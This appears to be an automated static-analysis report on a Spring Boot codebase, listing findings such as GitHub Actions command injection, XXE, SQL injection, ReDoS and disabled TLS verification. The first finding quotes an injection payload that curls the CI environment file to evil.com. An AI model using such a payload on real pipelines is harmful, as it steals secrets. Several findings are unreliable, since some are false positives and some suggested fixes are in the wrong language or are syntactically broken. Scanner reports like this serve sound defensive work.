findings.title: GitHub Actions Command Injection (Workflow Input)
findings.description:
**Critical: Command Injection in GitHub Actions Workflow**

**File**: `.github/workflows/trigger-docs-build.yml`
**Line**: 35

**Vulnerable pattern detected**: `${{ github.event.inputs.build-refname  }}`

**Code**:
```yaml
run: gh workflow run deploy-docs.yml -r docs-build -f build-refname=${{ github.event.inputs.build-refname }} -f build-sha=${{ github.event.inputs.build-sha }} -f build-version=${{ github.event.inputs.build-version }}
```

This workflow interpolates user-controlled input directly into a shell command.
An attacker can exploit this to execute arbitrary commands in your CI environment.

**Attack vector**:
- For PRs: Attacker opens a PR with a malicious title/branch name
- For issues: Attacker creates an issue with a malicious title/body
- For comments: Attacker posts a comment with shell injection payload

**Example attack payload** (in PR title):
```
"; curl -X POST -d @$GITHUB_ENV http://evil.com; #
```

This can lead to:
- **Secrets exfiltration**: GITHUB_TOKEN, AWS keys, API tokens
- **Supply chain attacks**: Malicious code pushed to main branch
- **Lateral movement**: Access to other repositories via GITHUB_TOKEN
- **Complete repository compromise**
findings.suggested_fix:
**Recommended fixes**:

1. **Use an intermediate environment variable** (preferred):
   ```yaml
   - name: Safe handling
     env:
       TITLE: ${{ github.event.inputs.build-refname  }}
     run: |
       echo "Title: $TITLE"
   ```

2. **Use GitHub Script action** (for complex logic):
   ```yaml
   - uses: actions/github-script@v7
     with:
       script: |
         const title = context.payload.pull_request.title;
         // Process safely in JavaScript
   ```

**References**:
- https://securitylab.github.com/research/github-actions-untrusted-input/
- https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions
findings.why_it_matters: Command injection in CI/CD pipelines can lead to complete repository compromise, secrets theft, and supply chain attacks affecting all users of your software.

findings.title: XML External Entity (XXE) vulnerability
findings.description:
XML parser processes external entities without proper restrictions.

**Analysis:**
⚠️ User input flows to XML parser
📦 In function: `getDocumentIfAvailable`
❌ No XXE protection detected for java
findings.why_it_matters:
XXE vulnerabilities allow attackers to:
• Read arbitrary files from the server (file:///etc/passwd)
• Perform SSRF attacks (http://internal-server/)
• Denial of service (billion laughs attack)
• Port scanning of internal networks

findings.title: Password may be logged in cleartext
findings.description:
Sensitive data (Password) appears in logging statement.

**Analysis:**
🔒 Credential type: Password
📦 In function: `run` (1 callers)
🚨 Production log level (error/warn)
findings.suggested_fix: Remove sensitive data from logs or use masking.
findings.why_it_matters:
Credentials logged in cleartext can be:
• Exposed in log files accessible to attackers
• Sent to centralized logging systems
• Visible in monitoring dashboards
• Captured in crash reports

findings.title: Insecure deserialization: eval()
findings.description:
Deserializing user-controlled data with eval() can lead to Remote Code Execution.

**Analysis:**
🔧 Method: eval()
⚠️ Risk: Direct code execution
📦 In function: `executeInitializrMetadataRetrieval` (1 callers)
findings.suggested_fix: Validate schema before deserializing user input.
findings.why_it_matters:
Insecure deserialization can allow attackers to:
• Execute arbitrary code on the server
• Bypass authentication
• Perform denial of service
• Access sensitive data

findings.title: Potential command injection via Java Runtime.exec/ProcessBuilder
findings.description: Runtime.exec or ProcessBuilder called with potentially user-controlled input. This allows arbitrary command execution.
findings.suggested_fix: Never pass raw user input to Runtime.exec() or ProcessBuilder. Use a whitelist of allowed commands.
findings.why_it_matters: Java's Runtime.exec() runs system commands. If user input controls the command, attackers can execute arbitrary commands.

findings.title: SQL Injection (Confirmed via Taint Analysis)
findings.description:
[COMPOUND: 2 co-located issues] **SQL Injection via Data Flow**

Taint analysis traced a path from user input to a SQL sink:

**Source**: `getUri` in `module/spring-boot-servlet/src/main/java/org/springframework/boot/servlet/actuate/web/exchanges/RecordableServletHttpRequest.java`:56
**Sink**: `text(` in `module/spring-boot-servlet/src/main/java/org/springframework/boot/servlet/actuate/web/exchanges/RecordableServletHttpRequest.java`:57
**Path**: `getUri → queryString → text( → text(`

This vulnerability was detected through data flow analysis, which traced how user-controlled data propagates through function calls to reach a dangerous SQL operation without proper sanitization.
findings.why_it_matters: This SQL injection was confirmed through data flow analysis, tracking user input from its source to the dangerous SQL operation. This is a high-confidence finding.

findings.title: Potential ReDoS vulnerability
findings.description:
Regex with nested quantifiers may cause catastrophic backtracking, leading to denial of service.

**Analysis:**
🔍 Pattern issue: nested quantifiers detected
📝 Pattern: `(?:^|:|,)(?:\s*\[)+`
🎯 User input detected in context
findings.why_it_matters:
ReDoS attacks exploit regex backtracking to consume CPU:
• A malicious input can take exponential time to evaluate
• Single requests can freeze the server
• Input like 'aaaaaaaaaaaaaaaaaaaaaaaaaaaa!' on /(a+)+$/ can hang

findings.title: Prototype pollution: jQuery-style extend
findings.description:
[COMPOUND: 3 co-located issues] Object merge/extend operation with user-controlled input can pollute Object.prototype.

**Analysis:**
🔍 Pattern: jQuery-style extend
⚠️ User input from: `input`
findings.why_it_matters:
Prototype pollution allows attackers to inject properties into Object.prototype, which affects ALL objects in the application. This can lead to:
• Remote Code Execution (via gadget chains)
• Denial of Service
• Authentication bypass
• Property injection

findings.title: Mutual recursion: 6 functions in call cycle (complexity 17)
findings.description: Mutual recursion detected: 6 functions form a call cycle. Cycle: /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/spring-boot/build-plugin/spring-boot-gradle-plugin/src/main/java/org/springframework/boot/gradle/plugin/CyclonedxPluginAction.java::CyclonedxPluginAction.configureBootJarTask:93 -> /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/spring-boot/build-plugin/spring-boot-gradle-plugin/src/main/java/org/springframework/boot/gradle/plugin/CyclonedxPluginAction.java::CyclonedxPluginAction.configureBootWarTask:98 -> /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/spring-boot/build-plugin/spring-boot-gradle-plugin/src/main/java/org/springframework/boot/gradle/plugin/CyclonedxPluginAction.java::CyclonedxPluginAction.configureJavaPlugin:70 -> /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/spring-boot/build-plugin/spring-boot-gradle-plugin/src/main/java/org/springframework/boot/gradle/plugin/CyclonedxPluginAction.java::CyclonedxPluginAction.configureSpringBootPlugin:85 -> /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/spring-boot/build-plugin/spring-boot-gradle-plugin/src/main/java/org/springframework/boot/gradle/plugin/CyclonedxPluginAction.java::CyclonedxPluginAction.configureTask:122 -> /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/spring-boot/build-plugin/spring-boot-gradle-plugin/src/main/java/org/springframework/boot/gradle/plugin/CyclonedxPluginAction.java::CyclonedxPluginAction.execute:51. Aggregate complexity: 17.
findings.suggested_fix: Break the cycle by extracting shared logic into a common helper, introducing an event system, or restructuring the call chain to be unidirectional.
findings.why_it_matters: Mutual recursion creates tight coupling between functions, making them impossible to understand, test, or refactor independently. It can also cause stack overflows if the recursion depth is unbounded.

Cycle: /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/spring-boot/build-plugin/spring-boot-maven-plugin/src/main/java/org/springframework/boot/maven/CommandLineBuilder.java::CommandLineBuilder.withArguments:80 -> /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/spring-boot/cli/spring-boot-cli/src/intTest/java/org/springframework/boot/cli/CommandLineIT.java::CommandLineIT.version:70 -> /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/spring-boot/cli/spring-boot-cli/src/intTest/java/org/springframework/boot/cli/infrastructure/CommandLineInvoker.java::CommandLineInvoker.Invocation.getLines:170 -> /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/spring-boot/cli/spring-boot-cli/src/intTest/java/org/springframework/boot/cli/infrastructure/CommandLineInvoker.java::CommandLineInvoker.Invocation.getStandardOutput:151 -> /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/spring-boot/cli/spring-boot-cli/src/intTest/java/org/springframework/boot/cli/infrastructure/CommandLineInvoker.java::CommandLineInvoker.Invocation.getStandardOutputLines:155 -> /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/spring-boot/cli/spring-boot-cli/src/intTest/java/org/springframework/boot/cli/infrastructure/CommandLineInvoker.java::CommandLineInvoker.Invocation.postProcessLines:159 ... (+15 more). Aggregate complexity: 65.
findings.suggested_fix: Break the cycle by extracting shared logic into a common helper, introducing an event system, or restructuring the call chain to be unidirectional.
findings.why_it_matters: Mutual recursion creates tight coupling between functions, making them impossible to understand, test, or refactor independently. It can also cause stack overflows if the recursion depth is unbounded.

findings.title: Insecure TLS/Certificate Validation (java)
findings.description:
**Hostname verification disabled** (CWE-295)

Disabled certificate or hostname verification detected.

**Pattern**: `NoopHostnameVerifier`
**File**: module/spring-boot-elasticsearch/src/main/java/org/springframework/boot/elasticsearch/autoconfigure/ElasticsearchRestClientConfigurations.java:38
**Code**: `import org.apache.hc.client5.http.ssl.NoopHostnameVerifier;`

This allows man-in-the-middle attacks. An attacker on the network can intercept and modify traffic without detection.
findings.suggested_fix: Use the default TrustManager and HostnameVerifier. For self-signed certs, add the CA to your trust store.

findings.title: Potential SQL Injection (CWE-89)
findings.description:
**Potential SQL Injection Vulnerability**

**Pattern detected**: string concatenation in SQL query

**Location**: module/spring-boot-web-server/src/testFixtures/java/org/springframework/boot/web/server/servlet/AbstractServletWebServerFactoryTests.java:1429

**Code snippet**:
```java
return httpClient.execute(new HttpGet("http://localhost:" + port + path),
```

SQL injection occurs when untrusted input is incorporated into SQL queries without
proper sanitization. An attacker could manipulate the query to:
- Access unauthorized data
- Modify or delete database records
- Execute administrative operations
- In some cases, execute operating system commands

This vulnerability is classified as **CWE-89: Improper Neutralization of Special
Elements used in an SQL Command ('SQL Injection')**.
findings.why_it_matters: SQL injection is one of the most dangerous vulnerabilities, allowing attackers to access, modify, or delete sensitive data in the database.

findings.title: Insecure deserialization: YAML unsafe load

findings.suggested_fix:

```python
# Instead of:
data = yaml.load(user_input)  # DANGEROUS

# Use:

# Or with SafeLoader:
data = yaml.load(user_input, Loader=yaml.SafeLoader)
```
findings.why_it_matters:
Insecure deserialization can allow attackers to:
• Execute arbitrary code on the server
• Bypass authentication
• Perform denial of service
• Access sensitive data

findings.title: Insecure TLS/Certificate Validation (java)
findings.description:
**Custom trust manager (may bypass validation)** (CWE-295)

Disabled certificate or hostname verification detected.

**Pattern**: `X509TrustManager`
**File**: module/spring-boot-cloudfoundry/src/main/java/org/springframework/boot/cloudfoundry/autoconfigure/actuate/endpoint/servlet/SkipSslVerificationHttpRequestFactory.java:61
**Code**: `context.init(null, new TrustManager[] { new SkipX509TrustManager() }, new SecureRandom());`

This allows man-in-the-middle attacks. An attacker on the network can intercept and modify traffic without detection.
findings.suggested_fix: Use the default TrustManager and HostnameVerifier. For self-signed certs, add the CA to your trust store.

findings.title: Broad exception catch
findings.description:
Catching generic Exception hides bugs and makes debugging difficult.

**Analysis:**
📞 Try block calls: _parseMessage, message, parse, call, connected
findings.suggested_fix:
Based on the operations in your try block, consider catching:
  • SyntaxError (for JSON.parse)
  • TypeError (network errors), AbortError

Example:
```python
except (SyntaxError (for JSON.parse)) as e:
logger.error(f"Operation failed: {e}")
```

findings.title: Potential ReDoS vulnerability
findings.description:
Regex with nested quantifiers may cause catastrophic backtracking, leading to denial of service.

**Analysis:**
🔍 Pattern issue: nested quantifiers
📝 Pattern: `((?:\((?:\([^()]+\)|[^()]+)+\)|\[(?:\[[^\[\]]*\]|[...`
findings.why_it_matters:
ReDoS attacks exploit regex backtracking to consume CPU:
• A malicious input can take exponential time to evaluate
• Single requests can freeze the server
• Input like 'aaaaaaaaaaaaaaaaaaaaaaaaaaaa!' on /(a+)+$/ can hang

findings.title: Regex compiled inside loop
findings.description:
Regex compiled in loop (loop starts line 4845).

**Performance impact:** Regex compilation is expensive. In a loop of N iterations, this costs N compilations instead of 1.
findings.suggested_fix:
Move regex compilation outside the loop:
```rust
let re = Regex::new(pattern)?;  // Before loop
for item in items {
re.is_match(item);  // Reuse
}
```
findings.why_it_matters: Regex compilation involves parsing and optimization. Doing it once instead of N times can dramatically improve performance.

findings.title: Test code in production: 1 issue
findings.description:
Test utilities and patterns found in what appears to be production code.

**Found:**
• Test code (line 22)
findings.suggested_fix:
Options:

1. **Move to test files:** If this is test code, move it to a test directory
2. **Use TYPE_CHECKING:** For type hints only, wrap imports in `if TYPE_CHECKING:`
3. **Environment check:** If needed at runtime, guard with environment variable

```python
# Instead of:
from unittest.mock import Mock

# Use:
from typing import TYPE_CHECKING
if TYPE_CHECKING:
from unittest.mock import Mock
```
findings.why_it_matters: Test code in production files adds confusion and potential bloat. It may be accidentally executed or cause import errors in environments without test dependencies.
